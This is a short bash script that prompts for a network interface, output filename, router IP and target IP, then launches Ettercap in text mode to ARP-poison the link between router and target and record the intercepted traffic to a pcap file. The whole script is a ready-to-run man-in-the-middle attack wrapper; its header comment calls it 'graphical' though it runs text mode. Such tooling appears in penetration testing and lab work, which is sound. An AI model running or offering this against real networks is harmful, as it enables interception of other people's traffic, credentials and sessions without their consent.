#! /bin/bash
# start Ettercap graphical
 
echo Launching Ettercap text...
echo Which interface to use i.e. eth0, wlan0 etc
read -p 'Interface: ' intervar
echo Enter filename
read -p 'Filename: ' filevar
echo Enter Target 1 IP
read -p 'Router IP: ' routervar
echo Enter Target 2 IP - if required
read -p 'Target IP: ' targetvar
ettercap -T -i $intervar -M ARP -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/

